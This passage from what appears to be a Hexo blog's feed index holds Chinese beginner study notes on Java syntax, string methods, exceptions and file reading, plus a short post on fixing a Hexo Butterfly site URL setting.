class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>1.常量本质上也是一种类变量，只是多了一个 static 关键字常量也可以叫做静态变量。</p><p>2.常量可以通过：ClassName.VariableName的方式访问。</p><p>3.常量在第一次被访问时创建，在程序结束时销毁。</p><p>4.不论一个类创建了多少个对象，类只拥有类变量的一份拷贝。</p><h1 id="数据存储-文件操作"><a href="#数据存储-文件操作" class="headerlink" title="数据存储 文件操作"></a>数据存储 文件操作</h1><p>常量数据是存储在 Java 的内存里，所以当程序重启后内存的数据会丢失的。如果不想数据丢失，就需要考虑数据持久化，一般持久化有两种手段：</p><p>1.储存在文件系统里。</p><p>2.存储在数据库里。</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="异常发生的原因通常有："><a href="#异常发生的原因通常有：" class="headerlink" title="异常发生的原因通常有："></a>异常发生的原因通常有：</h3><p>1.用户输入了非法数据。</p><p>2.要打开的文件不存在。</p><p>3.网络通信时连接中断，或者JVM内存溢出。</p><p>这些异常有的是因为用户错误引起，有的是程序错误引起的，还有其它一些是因为物理错误引起的。</p><h3 id="三种异常："><a href="#三种异常：" class="headerlink" title="三种异常："></a>三种异常：</h3><p>1.检查性异常（在编译时不会被忽略，例如打开一个不存在的文件）</p><p>2.运行性异常（在编译的时候会被忽略）</p><p>3.错误（脱离程序员控制，例如内存溢出）</p><h3 id="捕获异常："><a href="#捕获异常：" class="headerlink" title="捕获异常："></a>捕获异常：</h3><p>使用 try 和 catch 关键字可以捕获异常。try&#x2F;catch 代码块放在异常可能发生的地方。</p><p>try&#x2F;catch代码块中的代码称为保护代码，语法如下：</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">// 程序代码</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(ExceptionName e1)&#123;</span><br><span class="line">    <span class="comment">// Catch 块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Catch 语句包含要捕获异常类型的声明。</p><p>当保护代码块中发生一个异常时，try 后面的 catch 块就会被检查。</p><p>如果发生的异常包含在 catch 块中，异常会被传递到该 catch 块。</p><p><strong>意义：出现异常后程序可以继续运行</strong></p><h2 id="文件读"><a href="#文件读" class="headerlink" title="文件读"></a>文件读</h2><p>引入Apache Commons-io依赖（pom.xml）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">2.10</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">nameFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./111.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> FileUtils.readFileToString(nameFile, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            System.out.println(content);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程...？ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客折腾日记（三）问题汇总（1/1）</title>
      <link href="/2025/02/23/%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/"/>
      <url>/2025/02/23/%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="问题1：hexo-butterfly本地预览与实际部署效果不一样（已解决）"><a href="#问题1：hexo-butterfly本地预览与实际部署效果不一样（已解决）" class="headerlink" title="问题1：hexo butterfly本地预览与实际部署效果不一样（已解决）"></a>问题1：hexo butterfly本地预览与实际部署效果不一样（已解决）</h2><p>实际效果中排版变了，可能是css格式出了问题</p><p>上网搜索之后找到了解决方法：</p><p>在配置文件_config.yml里面（并非主题配置文件）找到如下代码</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://z41sarrebol.top</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br></pre></td></tr></table></figure><p>把url改成自己的域名即可</p>]]></content>
      
      
      <categories>
          
          <category> 博客折腾日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
            <tag> 避坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础</title>
      <link href="/2025/02/23/java/"/>
      <url>/2025/02/23/java/</url>
      
        <content type="html"><![CDATA[<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>1.变量等同于一个有命名的存储地址</p><p>2.变量是解决内容复用的</p><p>3.变量是有名称的，变量内容就是对象</p><h2 id="声明-declaration"><a href="#声明-declaration" class="headerlink" title="声明(declaration)"></a>声明(declaration)</h2><p>例 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string string;  </span><br><span class="line"><span class="type">int</span> age;</span><br></pre></td></tr></table></figure><p>注意：关键字无法进行声明，如public，class，void，int</p><h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;小明&quot;</span>  </span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">17</span></span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>1.数据基本类型：字符串，数字，布尔。</p><p>2.数字类型包含 ：</p><p>int小整数（-2的31次方~2的31次方-1）</p><p>long大整数（-2的63次方~2的63次方-1）</p><p>double浮点数</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>加减乘除：+ - * &#x2F;  取模：%</p><p>注意：Java执行的是整数除法，当两个数都是整数时，结果也自动变为正数。</p><h1 id="无返回值方法"><a href="#无返回值方法" class="headerlink" title="无返回值方法"></a>无返回值方法</h1><h2 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h2><p>函数在Java中也称为方法</p><p>随机数方法的应用较为广泛</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">value</span> <span class="operator">=</span> Math.random();</span><br><span class="line">System.out.println(value);</span><br></pre></td></tr></table></figure><p>返回随机数的范围是：0.0&lt;&#x3D; <strong>Math.random</strong> &lt;1.0 浮点类型的数据</p><p>如果需要得到0-9的随机数，那就需要进行类型转换+乘10操作</p><p>类型转换的语法为：</p><p>​<code>int nValue = (int) value;</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (value*10) 用小括号包围是因为先乘10得到结果在转化为整数</span></span><br><span class="line"><span class="comment">// 要不然得不到结果，这个就是数学的优先级</span></span><br><span class="line"><span class="type">int</span> <span class="variable">nValue</span> <span class="operator">=</span> (<span class="type">int</span>) (value*<span class="number">10</span>);</span><br></pre></td></tr></table></figure><h2 id="自定义方法"><a href="#自定义方法" class="headerlink" title="自定义方法"></a>自定义方法</h2><p>方法的语法为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// public（公共的） static（静态） void（空类型）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> 方法名称(方法参数)&#123;</span><br><span class="line">  代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="驼峰式命名法"><a href="#驼峰式命名法" class="headerlink" title="驼峰式命名法"></a>驼峰式命名法</h3><p>大驼峰 例：UserName MyDocument</p><p>小驼峰 例：userName passWd</p><p>方法的命名遵循小驼峰原则</p><p>方法的调用：直接写出即可，如new方法调用时写出 new();</p><h3 id="形参与实参"><a href="#形参与实参" class="headerlink" title="形参与实参"></a>形参与实参</h3><p>在方法中声明的变量成为形参，而在方法中传递的变量成为实参</p><p>在调用方法时，要传递进去一个“实际的”变量，这个变量就叫做实参。</p><h1 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h1><h3 id="if，else与else-if"><a href="#if，else与else-if" class="headerlink" title="if，else与else if"></a>if，else与else if</h3><p>格式： if(表达式){   代码块  }</p><p>接上的else语句没有( )部分，其他同理</p><p>如果使用else if，则与if同理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">report</span><span class="params">(String name,<span class="type">double</span> score)</span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(score &gt;= <span class="number">90</span>)&#123;</span><br><span class="line">    System.out.println(name+<span class="string">&quot;,你本次的成绩为优秀&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(score &gt;= <span class="number">80</span>)&#123;</span><br><span class="line">    System.out.println(name+<span class="string">&quot;,你本次的成绩为良好&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(score &gt;= <span class="number">60</span>)&#123;</span><br><span class="line">    System.out.println(name+<span class="string">&quot;,你本次的成绩为及格&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(name+<span class="string">&quot;,你本次的成绩为不通过&quot;</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="嵌套条件"><a href="#嵌套条件" class="headerlink" title="嵌套条件"></a>嵌套条件</h3><p>即 if 里面继续套 if &#x2F; else语句</p><h3 id="返回语句"><a href="#返回语句" class="headerlink" title="返回语句"></a>返回语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">plan</span><span class="params">(<span class="type">double</span> temperature)</span>&#123;</span><br><span class="line"></span><br><span class="line">  System.out.println(<span class="string">&quot;准备出门去学校&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(temperature&gt;<span class="number">38</span>)&#123;</span><br><span class="line">    <span class="comment">// 体温超过38度，不去了</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  System.out.println(<span class="string">&quot;去操场踢球&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果碰到体温大于38度的情况，就会”return” ，结束后续代码的执行。</p><p>注意：return后面不能有其它代码，除非在嵌套代码中（如上面的例子）</p><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>即一个方法也可以调用自身。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountDown</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    count(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">count</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">    System.out.println(number);</span><br><span class="line">    number = number - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;程序执行完毕&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    count(number);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="有返回值方法"><a href="#有返回值方法" class="headerlink" title="有返回值方法"></a>有返回值方法</h1><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>void：无返回值  其他类型：有返回值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">code</span><span class="params">(<span class="type">int</span> len)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">random</span><span class="params">()</span></span><br><span class="line"><span class="comment">//返回一个double类型的随机数</span></span><br></pre></td></tr></table></figure><p>声明double之后必须执行return返回结果</p><p>返回结果的类型必须与方法声明的返回值一致</p><h2 id="布尔-逻辑运算"><a href="#布尔-逻辑运算" class="headerlink" title="布尔&amp;&amp;逻辑运算"></a>布尔&amp;&amp;逻辑运算</h2><p>true与false</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> x&gt;<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;x&gt;0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>boolean类型也可以作为方法的参数或者返回类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isPass</span><span class="params">(<span class="type">int</span> score)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> score &gt;= <span class="number">60</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="逻辑运算符："><a href="#逻辑运算符：" class="headerlink" title="逻辑运算符："></a>逻辑运算符：</h3><p>and（与）：&amp;&amp;</p><p>or（或者）：||</p><p>not（非）：！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(x&gt;<span class="number">0</span> &amp;&amp; x &lt;<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="comment">// 表示 x 大于0 并且 x小于10时才为真</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x == <span class="number">60</span> || x == <span class="number">80</span>)&#123;</span><br><span class="line">  <span class="comment">// 表示 x 等于60 或者 x 等于80 都为真</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="comment">// 表示x不等于0的时候</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h2 id="自增与自减"><a href="#自增与自减" class="headerlink" title="自增与自减"></a>自增与自减</h2><p>自增同理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">number = number - <span class="number">1</span>;</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">number--;</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">number -= <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>变量创建方式与普通变量相似，但是后面跟了个 [ ]</p><p>初始化规定了数组的大小</p><p>如果没有存储实际的值，int类型的数据默认就是0，String类型默认是null</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明一个 int 数组的变量，数组大小为6</span></span><br><span class="line"><span class="type">int</span>[] numbers = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">6</span>];</span><br></pre></td></tr></table></figure><p>赋值可以借助下标来进行操作</p><p>0位代表第一个数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numbers[<span class="number">0</span>] = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="相关方法"><a href="#相关方法" class="headerlink" title="相关方法"></a>相关方法</h3><p>数组的长度.length</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">  <span class="type">int</span>[] numbers = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">8</span>];</span><br><span class="line">  <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> numbers.length;</span><br><span class="line">  System.out.println(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String[] tables = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">tables[<span class="number">0</span>] = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">tables[<span class="number">1</span>] = <span class="string">&quot;李四&quot;</span>;</span><br><span class="line">tables[<span class="number">2</span>] = <span class="string">&quot;王五&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt; tables.length;i++)&#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> tables[i];</span><br><span class="line">  System.out.println(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>int i&#x3D;0 声明了一个新的计数器，从零开始工作<br>i &lt; tables.length 声明了计数器的条件，最大值不超过tables.length<br>i++ 声明了计数器的递增机制，这里是递增，每次+1</p><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="相关方法-1"><a href="#相关方法-1" class="headerlink" title="相关方法"></a>相关方法</h2><h3 id="length长度"><a href="#length长度" class="headerlink" title="length长度"></a>length长度</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;我在学习&quot;</span>;</span><br><span class="line">  <span class="comment">// 调用字符串的长度方法得到长度</span></span><br><span class="line">  <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> message.length();</span><br><span class="line">  System.out.println(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="charAt单字符"><a href="#charAt单字符" class="headerlink" title="charAt单字符"></a>charAt单字符</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Hello Java&quot;</span>;</span><br><span class="line">  <span class="comment">// 取出第一个字</span></span><br><span class="line">  <span class="type">char</span> <span class="variable">str</span> <span class="operator">=</span> message.charAt(<span class="number">0</span>);</span><br><span class="line">  System.out.println(str);</span><br><span class="line">  <span class="comment">// 取出第二个字</span></span><br><span class="line">  str = message.charAt(<span class="number">1</span>);</span><br><span class="line">  System.out.println(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：chatAt方法返回的数据类型是char，单个字符的类型就是char，只能存储一个字符</p><h3 id="trim去空格"><a href="#trim去空格" class="headerlink" title="trim去空格"></a>trim去空格</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot; 666 &quot;</span>;</span><br><span class="line">    <span class="comment">// 去空格</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">newStr</span> <span class="operator">=</span> str.trim();</span><br><span class="line">    <span class="comment">// 打印一下新字符串的length，对比老的字符串的length</span></span><br><span class="line">    System.out.println(newStr+<span class="string">&quot;的长度是:&quot;</span>+newStr.length());</span><br><span class="line">    System.out.println(str+<span class="string">&quot;的长度是:&quot;</span>+str.length());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="indexOf查找"><a href="#indexOf查找" class="headerlink" title="indexOf查找"></a>indexOf查找</h3><p>indexOf方法接受一个String字符串，调用时，取文本中查找第一个匹配到的坐标索引值。</p><p>所以执行后可以得到一个int数字类型的数组，通过int数字的值来判断是否匹配</p><p>如果返回值是-1说明不匹配，如果不是-1，那就匹配到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Java是一种广泛使用的计算机编程语言&quot;</span></span><br><span class="line">   <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> str.indexOf(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(index!=-<span class="number">1</span>)&#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;匹配到了Java，索引位置是&quot;</span>+index);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;没有匹配到Java&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>如果想匹配第二个Java，可以设置从第一个Java的位置来查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">int</span> <span class="variable">index1</span> <span class="operator">=</span> str.indexOf(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line"> index1 = str.indexOf(<span class="string">&quot;Java&quot;</span>, index + <span class="number">4</span>);</span><br><span class="line"><span class="comment">// 这里4是开始查找的索引值，可以替换成string.length来计算</span></span><br></pre></td></tr></table></figure><h3 id="substring拼接"><a href="#substring拼接" class="headerlink" title="substring拼接"></a>substring拼接</h3><p>调用方式：</p><p>substring（开始索引，结束索引）如果没有设置结束索引，那就是默认到字符串结束</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Java是一种广泛使用的计算机编程语言&quot;</span></span><br><span class="line">   <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> str.indexOf(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span> (index != -<span class="number">1</span>) &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;匹配到了Java，索引位置是&quot;</span> + index);</span><br><span class="line">     <span class="type">String</span> <span class="variable">newStr</span> <span class="operator">=</span> str.substring(index+<span class="number">4</span>);</span><br><span class="line">     System.out.println(newStr);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;没有匹配到了Java&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="startsWith-endsWith内容判断"><a href="#startsWith-endsWith内容判断" class="headerlink" title="startsWith&#x2F;endsWith内容判断"></a>startsWith&#x2F;endsWith内容判断</h3><p>endsWith方法接受一个字符串参数，用于判断是否以该字符串结束，返回类型是boolean类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> 